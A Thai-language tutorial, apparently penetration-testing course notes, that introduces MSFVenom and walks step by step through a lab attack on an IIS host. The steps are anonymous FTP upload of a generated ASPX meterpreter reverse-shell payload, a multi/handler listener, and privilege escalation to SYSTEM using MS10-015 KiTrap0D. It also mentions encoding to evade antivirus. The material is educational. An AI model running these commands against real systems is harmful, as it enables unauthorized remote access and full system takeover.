# Introduction to MSFVenom

## MSFVenom คืออะไร?

**MSFVenom** เป็นเครื่องมือที่เกิดจากการรวมกันของ 2 tools เดิม:
1. **MSFPayload** - สร้าง shellcode สำหรับสถาปัตยกรรมและ OS ต่างๆ
2. **MSFEncode** - เข้ารหัส shellcode เพื่อหลีกเลี่ยง bad characters และ AV/IPS/IDS

### วิวัฒนาการของเครื่องมือ:

**แต่ก่อน (Before MSFVenom):**
```bash
# ต้องใช้ pipe (|) เชื่อม 2 คำสั่ง
MSFPayload → MSFEncode
```

**ปัจจุบัน (MSFVenom):**
- รวม 2 เครื่องมือเป็นหนึ่งเดียว
- สะดวกและรวดเร็วกว่า
- มีฟีเจอร์ครบถ้วนกว่า

---

## วัตถุประสงค์หลักของ MSFVenom

### 1. **สร้าง Payload ที่ปรับแต่งได้**
- รองรับหลายสถาปัตยกรรม (x86, x64, ARM, ...)
- รองรับหลาย OS (Windows, Linux, MacOS, ...)
- รองรับหลายรูปแบบไฟล์ (.exe, .aspx, .php, .jar, ...)

### 2. **ทำความสะอาด Shellcode**
- ลบ **bad characters** ที่อาจทำให้เกิด error
- ป้องกันความไม่เสถียรตอน runtime

### 3. **Encoding เพื่อหลบหลีก AV (ในอดีต)**
⚠️ **หมายเหตุสำคัญ:** การหลบหลีก AV สมัยใหม่ยากมากขึ้น เนื่องจาก:
- **Heuristic Analysis** - วิเคราะห์พฤติกรรมที่น่าสงสัย
- **Machine Learning** - เรียนรู้จากรูปแบบมัลแวร์
- **Deep Packet Inspection** - ตรวจสอบ network traffic อย่างละเอียด

---

## 📚 ตัวอย่างการใช้งานจริง (Practical Example)

### สถานการณ์:

เราพบเซิร์ฟเวอร์ที่มีช่องโหว่ดังนี้:
1. **FTP Port (21)** เปิดอยู่ และอนุญาต **Anonymous login**
2. **Web Service (80)** รันบนเครื่องเดียวกัน
3. ไฟล์ใน FTP root สามารถเข้าถึงได้ผ่าน web ที่ `/uploads`
4. Web service **ไม่มีการตรวจสอบ** ประเภทไฟล์ที่รัน

**แผนการโจมตี:**
```
1. Upload PHP/ASPX shell ผ่าน FTP
2. เข้าถึง shell ผ่าน web browser
3. ได้ reverse shell กลับมาที่เครื่องเรา
```

---

## 🔍 ขั้นตอนการโจมตี (Step-by-Step)

### **ขั้นที่ 1: Scan เป้าหมาย**

```bash
nmap -sV -T4 -p- 10.10.10.5
```

**ผลลัพธ์:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows
```

---

### **ขั้นที่ 2: ทดสอบ FTP Anonymous Access**

```bash
ftp 10.10.10.5
```

**Login:**
```
Name: anonymous
Password: (ใส่อะไรก็ได้)
```

**ตรวจสอบไฟล์:**
```
ftp> ls

03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

**สังเกต:** มีโฟลเดอร์ `aspnet_client` → แสดงว่าเซิร์ฟเวอร์รัน **ASP.NET** และสามารถรันไฟล์ `.aspx` ได้!

---

### **ขั้นที่ 3: สร้าง Payload ด้วย MSFVenom**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

**คำอธิบายพารามิเตอร์:**

| พารามิเตอร์ | คำอธิบาย |
|------------|----------|
| `-p windows/meterpreter/reverse_tcp` | เลือก payload ประเภท reverse TCP สำหรับ Windows |
| `LHOST=10.10.14.5` | IP ของเครื่องเรา (ที่จะรับ connection) |
| `LPORT=1337` | Port ที่เราจะเปิดรอรับ connection |
| `-f aspx` | รูปแบบไฟล์ output เป็น .aspx |
| `> reverse_shell.aspx` | บันทึกเป็นไฟล์ชื่อนี้ |

**ผลลัพธ์:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

---

### **ขั้นที่ 4: ตั้งค่า Listener (Multi/Handler)**

```bash
msfconsole -q
```

**ใน msfconsole:**
```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > run
```

**ผลลัพธ์:**
```
[*] Started reverse TCP handler on 10.10.14.5:1337
```

💡 **หมายเหตุ:** `multi/handler` เป็น module ที่ใช้รับ reverse connection จาก payload ที่เราสร้าง

---

### **ขั้นที่ 5: Upload Payload ผ่าน FTP**

```bash
ftp> put reverse_shell.aspx
```

---

### **ขั้นที่ 6: Trigger Payload**

เปิดเว็บเบราว์เซอร์และเข้า:
```
http://10.10.10.5/reverse_shell.aspx
```

**ผลลัพธ์:**
- หน้าเว็บจะดูว่างเปล่า (ไม่มี HTML)
- แต่ payload ถูกรันใน background!

---

### **ขั้นที่ 7: ได้ Meterpreter Shell แล้ว!**

กลับมาดูที่ msfconsole:
```bash
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157)

meterpreter > getuid
Server username: IIS APPPOOL\Web
```

🎉 **สำเร็จ!** เราได้ shell ในระบบแล้ว (แม้จะเป็น user ที่มีสิทธิ์น้อย)

---

## 🔐 การยก Privilege (Privilege Escalation)

### ใช้ Local Exploit Suggester

**Module นี้ช่วยอะไร:**
- แนะนำ local exploits ที่ใช้ได้กับระบบเป้าหมาย
- ประหยัดเวลาในการหา exploit ที่เหมาะสม
- ตรวจสอบว่า exploit ไหนใช้ได้จริง

### ขั้นตอนการใช้งาน:

#### 1. **ค้นหา Module**
```bash
msf6 > search local exploit suggester
```

#### 2. **ใช้ Module**
```bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

#### 3. **ผลลัพธ์ (ตัวอย่าง)**
```bash
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 31 exploit checks are being tried...

[+] exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] exploit/windows/local/ms10_015_kitrap0d: The service is running
[+] exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
...
```

---

### ทดลองใช้ Exploit: MS10-015 (KiTrap0D)

#### 1. **เลือก Exploit**
```bash
msf6 > use exploit/windows/local/ms10_015_kitrap0d
```

#### 2. **ตั้งค่า Options**
```bash
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
```

#### 3. **ผลลัพธ์ - ได้ SYSTEM แล้ว!**
```bash
[*] Started reverse TCP handler on 10.10.14.5:1338
[*] Launching notepad to host the exploit...
[+] Process 3552 launched.
[*] Reflectively injecting the exploit DLL into 3552...
[*] Payload injected. Executing exploit...
[*] Meterpreter session 4 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

🎯 **สำเร็จ!** ได้สิทธิ์ระดับ **SYSTEM** (สิทธิ์สูงสุดใน Windows) แล้ว!

---

